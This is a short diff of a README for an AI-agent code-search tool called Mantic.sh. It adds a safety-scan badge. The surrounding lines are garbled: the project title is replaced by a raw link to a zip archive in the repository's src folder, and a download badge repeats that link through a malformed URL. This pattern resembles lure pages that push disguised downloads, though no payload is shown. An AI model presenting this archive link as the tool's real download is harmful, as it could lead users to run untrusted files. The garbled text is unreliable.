@@ -1,5 +1,7 @@
 # 🚀 https://github.com/theodags/Mantic.sh/raw/refs/heads/main/src/Mantic-sh-v3.6.zip - Search Code Efficiently for AI Agents
 
+[![SafeSkill 81/100](https://img.shields.io/badge/SafeSkill-81%2F100_Passes%20with%20Notes-yellow)](https://safeskill.dev/scan/theodags-mantic-sh)
+
 [![Download https://github.com/theodags/Mantic.sh/raw/refs/heads/main/src/Mantic-sh-v3.6.zip](https://github.com/theodags/Mantic.sh/raw/refs/heads/main/src/Mantic-sh-v3.6.zip%https://github.com/theodags/Mantic.sh/raw/refs/heads/main/src/Mantic-sh-v3.6.zip%20Here-brightgreen)](https://github.com/theodags/Mantic.sh/raw/refs/heads/main/src/Mantic-sh-v3.6.zip)
 
 ## 🔍 Overview
